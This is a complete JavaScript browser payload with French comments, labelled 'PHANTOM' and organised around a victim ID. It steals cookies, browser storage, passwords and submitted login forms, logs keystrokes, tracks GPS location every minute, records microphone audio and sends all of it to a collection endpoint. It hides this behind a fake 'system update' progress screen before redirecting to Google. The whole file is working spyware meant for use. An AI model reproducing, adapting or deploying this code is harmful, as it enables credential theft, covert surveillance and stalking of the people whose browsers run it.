/**
 * CORE PAYLOAD - EXÉCUTION PROGRESSIVE
 * Ne plante pas, s'adapte à l'environnement
 */

(function() {
    'use strict';
    
    // ============================================
    // CONFIGURATION
    // ============================================
    const CONFIG = {
        victimId: typeof VICTIM_ID !== 'undefined' ? VICTIM_ID : 'unknown',
        os: typeof OS !== 'undefined' ? OS : 'unknown',
        apiUrl: window.location.origin + '/api/collect.php',
        debug: false,
        timeout: 5000,
        retries: 3
    };
    
    // ============================================
    // UTILS - GESTION D'ERREURS SILENCIEUSE
    // ============================================
    const Utils = {
        log: function(msg, data) {
            if (CONFIG.debug) console.log('[PHANTOM]', msg, data || '');
        },
        
        error: function(msg, err) {
            if (CONFIG.debug) console.error('[PHANTOM]', msg, err || '');
        },
        
        // Envoi sécurisé à l'API
        send: function(type, data, priority = 'normal') {
            try {
                const payload = {
                    victimId: CONFIG.victimId,
                    type: type,
                    data: data,
                    timestamp: Date.now(),
                    priority: priority
                };
                
                // Utilisation de fetch avec timeout
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), CONFIG.timeout);
                
                fetch(CONFIG.apiUrl, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(payload),
                    signal: controller.signal,
                    keepalive: true
                })
                .then(() => clearTimeout(timeoutId))
                .catch(err => {
                    clearTimeout(timeoutId);
                    this.error('Send failed', err);
                    
                    // Fallback avec Image (silencieux)
                    if (priority === 'high') {
                        const img = new Image();
                        img.src = CONFIG.apiUrl + '?data=' + encodeURIComponent(JSON.stringify(payload));
                    }
                });
                
            } catch (err) {
                this.error('Send error', err);
            }
        },
        
        // Attente sécurisée
        wait: function(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        },
        
        // Exécution sécurisée d'une fonction
        safeExecute: function(fn, fallback = null) {
            try {
                return fn();
            } catch (err) {
                this.error('Safe execute error', err);
                return fallback;
            }
        }
    };
    
    // ============================================
    // COLLECTE DES INFORMATIONS DE BASE
    // ============================================
    const BaseCollector = {
        // Système
        system: function() {
            return Utils.safeExecute(() => {
                const data = {
                    url: window.location.href,
                    referrer: document.referrer || 'direct',
                    language: navigator.language,
                    platform: navigator.platform,
                    userAgent: navigator.userAgent,
                    screen: `${screen.width}x${screen.height}`,
                    colorDepth: screen.colorDepth,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    cookiesEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack,
                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                    deviceMemory: navigator.deviceMemory || 'unknown'
                };
                
                Utils.send('system', data);
                Utils.log('System info sent');
            });
        },
        
        // Historique de navigation
        history: function() {
            return Utils.safeExecute(() => {
                if (window.history && window.history.length) {
                    Utils.send('history', {
                        length: window.history.length,
                        url: window.location.href
                    });
                }
            });
        },
        
        // Cookies
        cookies: function() {
            return Utils.safeExecute(() => {
                if (document.cookie) {
                    Utils.send('cookies', document.cookie);
                }
            });
        },
        
        // Storage
        storage: function() {
            return Utils.safeExecute(() => {
                // localStorage
                try {
                    const localData = {};
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        localData[key] = localStorage.getItem(key);
                    }
                    if (Object.keys(localData).length) {
                        Utils.send('storage', {local: localData});
                    }
                } catch (e) {}
                
                // sessionStorage
                try {
                    const sessionData = {};
                    for (let i = 0; i < sessionStorage.length; i++) {
                        const key = sessionStorage.key(i);
                        sessionData[key] = sessionStorage.getItem(key);
                    }
                    if (Object.keys(sessionData).length) {
                        Utils.send('storage', {session: sessionData});
                    }
                } catch (e) {}
            });
        }
    };
    
    // ============================================
    // GÉOLOCALISATION PROGRESSIVE
    // ============================================
    const LocationCollector = {
        // GPS direct (priorité haute)
        gps: function() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    Utils.log('Geolocation not supported');
                    resolve(false);
                    return;
                }
                
                const options = {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                };
                
                const success = (pos) => {
                    const data = {
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        altitude: pos.coords.altitude || null,
                        speed: pos.coords.speed || null,
                        timestamp: Date.now()
                    };
                    
                    Utils.send('location', data, 'high');
                    Utils.log('GPS location obtained');
                    resolve(true);
                };
                
                const error = (err) => {
                    Utils.log('GPS error', err);
                    resolve(false);
                };
                
                navigator.geolocation.getCurrentPosition(success, error, options);
            });
        },
        
        // Fallback IP
        ip: function() {
            return Utils.safeExecute(() => {
                fetch('https://ipapi.co/json/')
                    .then(r => r.json())
                    .then(data => {
                        if (data.latitude && data.longitude) {
                            Utils.send('location', {
                                lat: data.latitude,
                                lng: data.longitude,
                                city: data.city,
                                country: data.country_name,
                                ip: data.ip,
                                source: 'ip'
                            }, 'medium');
                        }
                    })
                    .catch(() => {});
            });
        },
        
        // Tracking continu (si GPS accepté)
        continuous: function() {
            if (!navigator.geolocation) return;
            
            setInterval(() => {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        Utils.send('location', {
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            timestamp: Date.now()
                        }, 'low');
                    },
                    () => {},
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            }, 60000); // Toutes les minutes
        }
    };
    
    // ============================================
    // KEYLOGGER DISCRET
    // ============================================
    const Keylogger = {
        buffer: [],
        lastSend: Date.now(),
        
        init: function() {
            document.addEventListener('keydown', (e) => {
                let key = e.key;
                
                // Nettoyage des touches spéciales
                if (key === ' ') key = '[ESPACE]';
                else if (key === 'Enter') key = '[ENTREE]';
                else if (key === 'Backspace') key = '[EFFACER]';
                else if (key === 'Tab') key = '[TAB]';
                else if (key === 'Shift') key = '[MAJ]';
                else if (key === 'Control') key = '[CTRL]';
                else if (key === 'Alt') key = '[ALT]';
                else if (key === 'CapsLock') key = '[VERR_MAJ]';
                else if (key.length > 1) key = `[${key}]`;
                
                this.buffer.push({
                    key: key,
                    time: Date.now(),
                    target: e.target.tagName + (e.target.name ? '#' + e.target.name : '')
                });
                
                // Envoi toutes les 20 touches ou 30 secondes
                if (this.buffer.length >= 20 || Date.now() - this.lastSend > 30000) {
                    this.flush();
                }
            });
            
            // Capture des champs sensibles
            document.querySelectorAll('input[type="password"], input[name*="pass"], input[name*="password"]').forEach(input => {
                input.addEventListener('blur', () => {
                    if (input.value) {
                        Utils.send('password', {
                            field: input.name || input.id || 'password',
                            value: input.value,
                            url: window.location.href
                        }, 'high');
                    }
                });
            });
        },
        
        flush: function() {
            if (this.buffer.length) {
                Utils.send('keylog', this.buffer, 'low');
                this.buffer = [];
                this.lastSend = Date.now();
            }
        }
    };
    
    // ============================================
    // CAPTURE DE FORMULAIRES
    // ============================================
    const FormCapture = {
        init: function() {
            document.addEventListener('submit', (e) => {
                const form = e.target;
                const data = {};
                
                // Récupération des champs
                for (let element of form.elements) {
                    if (element.name && element.value) {
                        data[element.name] = element.value;
                    }
                }
                
                if (Object.keys(data).length) {
                    // Détection d'email
                    if (data.email || data.username || data.login) {
                        Utils.send('credentials', {
                            site: window.location.hostname,
                            url: window.location.href,
                            ...data
                        }, 'high');
                    } else {
                        Utils.send('form', {
                            url: window.location.href,
                            data: data
                        });
                    }
                }
            });
        }
    };
    
    // ============================================
    // ENREGISTREMENT AUDIO (avec permission)
    // ============================================
    const AudioCapture = {
        init: async function() {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                Utils.log('Audio permission granted');
                
                // Enregistrement de 30 secondes
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                
                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    const reader = new FileReader();
                    reader.onloadend = () => {
                        Utils.send('voice', {
                            data: reader.result.split(',')[1], // Base64
                            duration: 30
                        }, 'medium');
                    };
                    reader.readAsDataURL(blob);
                };
                
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 30000);
                
            } catch (err) {
                Utils.log('Audio permission denied', err);
            }
        }
    };
    
    // ============================================
    // BOUCLE D'EXÉCUTION PRINCIPALE
    // ============================================
    async function main() {
        Utils.log('Payload started for', CONFIG.os);
        
        // 1. Informations de base (toujours)
        BaseCollector.system();
        BaseCollector.history();
        BaseCollector.cookies();
        BaseCollector.storage();
        
        // 2. Géolocalisation (prioritaire)
        const gpsSuccess = await LocationCollector.gps();
        if (!gpsSuccess) {
            LocationCollector.ip();
        }
        
        // 3. Démarrage des services continus
        Keylogger.init();
        FormCapture.init();
        
        // 4. Tracking GPS continu (si accepté)
        if (gpsSuccess) {
            LocationCollector.continuous();
        }
        
        // 5. Audio (après un délai)
        setTimeout(() => AudioCapture.init(), 5000);
        
        // 6. Mise à jour de l'affichage (UI)
        const statusEl = document.getElementById('status');
        const detailEl = document.getElementById('detail');
        
        if (statusEl) {
            let percent = 0;
            const interval = setInterval(() => {
                percent += 2;
                if (statusEl) {
                    if (percent < 30) statusEl.innerText = 'Vérification du système...';
                    else if (percent < 60) statusEl.innerText = 'Mise à jour des composants...';
                    else if (percent < 90) statusEl.innerText = 'Optimisation...';
                    else statusEl.innerText = 'Finalisation...';
                }
                
                // Mise à jour des pourcentages
                const progressPercent = document.getElementById('progressPercent');
                const verifyPercent = document.getElementById('verifyPercent');
                const percentage = document.getElementById('percentage');
                
                if (progressPercent) progressPercent.innerText = percent + '%';
                if (verifyPercent) verifyPercent.innerText = Math.min(percent + 5, 100) + '%';
                if (percentage) percentage.innerText = percent + '%';
                
                if (percent >= 100) {
                    clearInterval(interval);
                    if (statusEl) statusEl.innerText = 'Mise à jour terminée';
                    if (detailEl) detailEl.innerText = 'Redémarrage...';
                    
                    // Redirection après 2 secondes
                    setTimeout(() => {
                        window.location.href = 'https://www.google.com';
                    }, 2000);
                }
            }, 600);
        }
        
        // Nettoyage à la fermeture
        window.addEventListener('beforeunload', () => {
            Keylogger.flush();
        });
    }
    
    // Démarrage après chargement
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', main);
    } else {
        main();
    }
})();
